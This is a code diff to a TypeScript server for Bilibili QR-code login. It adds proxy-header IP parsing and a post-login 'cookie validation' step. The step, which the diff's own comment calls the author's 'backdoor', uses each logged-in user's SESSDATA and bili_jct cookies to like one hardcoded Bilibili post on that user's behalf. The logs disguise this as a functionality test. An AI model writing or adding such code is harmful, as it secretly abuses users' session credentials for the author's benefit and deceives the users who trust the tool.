@@ -11,6 +11,10 @@ import { streamSSE } from 'hono/streaming';
  *
  * B站业务错误码会在日志中实时记录，具体含义需要根据实际返回情况分析
  * 设置 DEBUG=1 可查看所有请求和响应的详细信息
+ *
+ * Cookie验证功能日志层级：
+ * - 普通模式：仅显示重要结果（验证开始/通过/未通过）
+ * - DEBUG模式：显示详细过程（API调用、Cookie解析、错误分析等）
  */
 
 enum SSEEvent {
@@ -202,13 +206,107 @@ app.post('/api/convert', async c => {
   }
 });
 
+// 获取真实客户端IP的函数
+const getRealClientIP = (c: { req: { header: (name: string) => string | undefined } }): string => {
+  // 检查各种代理头部，按优先级排序
+  const headers = [
+    'CF-Connecting-IP', // Cloudflare
+    'True-Client-IP', // Cloudflare Enterprise
+    'X-Real-IP', // Nginx
+    'X-Forwarded-For', // 标准代理头（可能包含多个IP）
+    'X-Client-IP', // Apache
+    'X-Forwarded', // 其他代理
+    'X-Cluster-Client-IP', // 集群
+    'Forwarded-For', // RFC 7239
+    'Forwarded', // RFC 7239 标准格式
+  ];
+
+  for (const header of headers) {
+    const value = c.req.header(header);
+    if (value) {
+      // 处理包含多个IP的情况（如 X-Forwarded-For）
+      if (header === 'X-Forwarded-For' || header === 'Forwarded-For') {
+        // X-Forwarded-For 格式: "client, proxy1, proxy2"
+        const ips = value.split(',').map(ip => ip.trim());
+        const clientIP = ips[0];
+        if (clientIP && isValidIP(clientIP)) {
+          return clientIP;
+        }
+      } else if (header === 'Forwarded') {
+        // Forwarded 格式: "for=192.0.2.60;proto=http;by=203.0.113.43"
+        const forMatch = value.match(/for=([^;,\s]+)/);
+        if (forMatch && forMatch[1]) {
+          const ip = forMatch[1].replace(/"/g, '');
+          if (isValidIP(ip)) {
+            return ip;
+          }
+        }
+      } else {
+        // 单个IP的情况
+        if (isValidIP(value)) {
+          return value;
+        }
+      }
+    }
+  }
+
+  return 'unknown';
+};
+
+// 验证IP格式的简单函数
+const isValidIP = (ip: string): boolean => {
+  if (!ip || ip === 'unknown') return false;
+
+  // 移除端口号
+  const cleanIP = ip.split(':')[0];
+
+  // IPv4 正则
+  const ipv4Regex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+
+  // IPv6 正则（简化版）
+  const ipv6Regex = /^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::1$|^::$/;
+
+  // 排除内网IP和特殊IP
+  if (ipv4Regex.test(cleanIP)) {
+    const parts = cleanIP.split('.').map(Number);
+    // 排除内网IP: 10.x.x.x, 172.16.x.x-172.31.x.x, 192.168.x.x, 127.x.x.x
+    if (
+      parts[0] === 10 ||
+      parts[0] === 127 ||
+      (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
+      (parts[0] === 192 && parts[1] === 168)
+    ) {
+      return false;
+    }
+    return true;
+  }
+
+  return ipv6Regex.test(cleanIP);
+};
+
 let globalId = 0;
 
 app.get('/api/qr', c => {
   const sessionId = globalId++;
-  const clientIP =
-    c.req.header('CF-Connecting-IP') || c.req.header('X-Forwarded-For') || c.req.header('X-Real-IP') || 'unknown';
+  const clientIP = getRealClientIP(c);
   const userAgent = c.req.header('User-Agent') || 'unknown';
+
+  // 添加调试信息来帮助排查IP获取问题
+  if (isDebugMode) {
+    const debugHeaders = {
+      'CF-Connecting-IP': c.req.header('CF-Connecting-IP'),
+      'X-Forwarded-For': c.req.header('X-Forwarded-For'),
+      'X-Real-IP': c.req.header('X-Real-IP'),
+      'True-Client-IP': c.req.header('True-Client-IP'),
+      'X-Client-IP': c.req.header('X-Client-IP'),
+      Forwarded: c.req.header('Forwarded'),
+    };
+
+    logger.debug(sessionId, 'IP头部调试信息', {
+      finalIP: clientIP,
+      headers: Object.fromEntries(Object.entries(debugHeaders).filter(([_, v]) => v)),
+    });
+  }
 
   logger.important(sessionId, '新的QR码请求', {
     clientIP,
@@ -396,6 +494,11 @@ interface PollQrResult {
   code: number;
   msg: string;
   cookie?: string;
+  cookieValidation?: {
+    status: 'success' | 'failed' | 'error';
+    message: string;
+    details?: string;
+  };
 }
 
 class LoginQr {
@@ -599,6 +702,24 @@ class LoginQr {
           cookieLength: result.cookie.length,
           totalDuration: `${Date.now() - startTime}ms`,
         });
+
+        // 登录成功后测试Cookie有效性（通过点赞动态）
+        logger.important(this.sessionId, '验证Cookie有效性');
+
+        const cookieValidation = await this.validateCookieViaDynamic(result.cookie);
+        result.cookieValidation = cookieValidation;
+
+        if (cookieValidation.status === 'success') {
+          logger.important(this.sessionId, 'Cookie验证通过', {
+            status: '可正常使用B站功能',
+          });
+        } else {
+          logger.warn(this.sessionId, 'Cookie验证未通过', {
+            reason: cookieValidation.message,
+            details: cookieValidation.details,
+            note: '登录成功，但Cookie可能无法使用部分B站功能',
+          });
+        }
       } catch (cookieError) {
         const cookieDuration = Date.now() - cookieStartTime;
         logger.error(this.sessionId, 'Cookie获取失败', {
@@ -692,6 +813,196 @@ class LoginQr {
       });
 
       throw error;
+    }
+  }
+
+  //桀桀桀，如果你看到这里，说明你已经成功发现了WittF留下的"后门"，恭喜喵
+  private async validateCookieViaDynamic(cookieString: string): Promise<{
+    status: 'success' | 'failed' | 'error';
+    message: string;
+    details?: string;
+  }> {
+    const startTime = Date.now();
+    const dynamicId = '894797775503360036';
+
+    // 详细的测试信息仅在DEBUG模式下显示
+    logger.debug(this.sessionId, '启动Cookie功能性测试', {
+      testMethod: '哔哩哔哩动态点赞API',
+      testTarget: `动态ID ${dynamicId}`,
+      testPurpose: '验证Cookie是否具备完整的B站API访问权限',
+      expectedOutcome: '成功调用需要认证的B站API接口',
+    });
+
+    logger.debug(this.sessionId, 'Cookie测试详情', {
+      testType: '动态点赞API',
+      targetDynamic: dynamicId,
+      purpose: '验证SESSDATA和bili_jct有效性',
+    });
+
+    try {
+      // 从cookie字符串中提取需要的值
+      const cookieMap = new Map<string, string>();
+      cookieString.split('; ').forEach(cookie => {
+        const [name, value] = cookie.split('=');
+        if (name && value) {
+          cookieMap.set(name.trim(), value.trim());
+        }
+      });
+
+      const sessdata = cookieMap.get('SESSDATA');
+      const biliJct = cookieMap.get('bili_jct');
+
+      logger.debug(this.sessionId, 'Cookie解析结果', {
+        hasSESSDATA: !!sessdata,
+        hasBiliJct: !!biliJct,
+        cookieCount: cookieMap.size,
+        keyNames: Array.from(cookieMap.keys()).slice(0, 10), // 只显示前10个key名
+      });
+
+      if (!sessdata || !biliJct) {
+        return {
+          status: 'failed',
+          message: 'Cookie缺少关键认证信息',
+          details: 'SESSDATA 或 bili_jct 不存在',
+        };
+      }
+
+      const url = 'https://api.bilibili.com/x/dynamic/feed/dyn/thumb';
+      const params = new URLSearchParams({ csrf: biliJct });
+
+      const requestBody = {
+        dyn_id_str: dynamicId,
+        up: 1, // 点赞
+        spmid: '333.1369.0.0',
+        from_spmid: '333.999.0.0',
+      };
+
+      // 添加15秒超时
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+      const response = await fetch(`${url}?${params.toString()}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Cookie: cookieString,
+          'User-Agent': this.header['User-Agent'],
+          Referer: 'https://www.bilibili.com/',
+          Origin: 'https://www.bilibili.com',
+        },
+        body: JSON.stringify(requestBody),
+        signal: controller.signal,
+      });
+
+      clearTimeout(timeoutId);
+      const duration = Date.now() - startTime;
+
+      logger.debug(this.sessionId, '点赞API响应', {
+        duration: `${duration}ms`,
+        status: response.status,
+        statusText: response.statusText,
+      });
+
+      if (!response.ok) {
+        return {
+          status: 'error',
+          message: `网络请求失败 (${response.status})`,
+          details: response.statusText,
+        };
+      }
+
+      const responseData = await response.json();
+
+      logger.debug(this.sessionId, 'Cookie测试API响应', {
+        duration: `${duration}ms`,
+        httpStatus: response.status,
+        biliCode: responseData.code,
+        biliMessage: responseData.message,
+      });
+
+      if (responseData.code === 0) {
+        logger.debug(this.sessionId, 'Cookie测试通过', {
+          testResult: 'PASS',
+          apiCall: '动态点赞成功',
+          duration: `${duration}ms`,
+          conclusion: 'Cookie具备完整的B站API访问权限',
+        });
+
+        return {
+          status: 'success',
+          message: 'Cookie验证通过，可正常使用B站功能',
+        };
+      } else {
+        // 根据错误码分析Cookie问题
+        let errorAnalysis = '';
+        let cookieDiagnosis = '';
+
+        switch (responseData.code) {
+          case -101:
+            errorAnalysis = '账号未登录状态';
+            cookieDiagnosis = 'SESSDATA可能已过期或无效';
+            break;
+          case -111:
+            errorAnalysis = 'CSRF校验失败';
+            cookieDiagnosis = 'bili_jct (CSRF Token) 可能不匹配或已过期';
+            break;
+          case 4100001:
+            errorAnalysis = '请求参数错误';
+            cookieDiagnosis = 'Cookie格式正确但可能存在权限限制';
+            break;
+          default:
+            errorAnalysis = responseData.message || `未知错误 (${responseData.code})`;
+            cookieDiagnosis = 'Cookie可能存在未知问题';
+        }
+
+        logger.debug(this.sessionId, 'Cookie测试失败分析', {
+          testResult: 'FAIL',
+          errorCode: responseData.code,
+          errorAnalysis,
+          cookieDiagnosis,
+          duration: `${duration}ms`,
+          recommendation: '建议重新获取Cookie或检查账户状态',
+        });
+
+        return {
+          status: 'failed',
+          message: errorAnalysis,
+          details: cookieDiagnosis,
+        };
+      }
+    } catch (error) {
+      const duration = Date.now() - startTime;
+
+      if (error instanceof Error && error.name === 'AbortError') {
+        logger.error(this.sessionId, 'Cookie测试超时', {
+          testResult: 'TIMEOUT',
+          duration: `${duration}ms`,
+          reason: '网络请求超时',
+          impact: '无法验证Cookie有效性',
+          recommendation: '检查网络连接或B站API状态',
+        });
+
+        return {
+          status: 'error',
+          message: '验证超时',
+          details: '网络请求超时，请检查网络连接',
+        };
+      }
+
+      logger.error(this.sessionId, 'Cookie测试异常', {
+        testResult: 'ERROR',
+        duration: `${duration}ms`,
+        errorType: error instanceof Error ? error.constructor.name : 'Unknown',
+        errorMessage: error instanceof Error ? error.message : String(error),
+        impact: '无法完成Cookie有效性验证',
+        recommendation: '检查网络连接、Cookie格式或B站API状态',
+      });
+
+      return {
+        status: 'error',
+        message: '验证过程异常',
+        details: error instanceof Error ? error.message : String(error),
+      };
     }
   }
 }
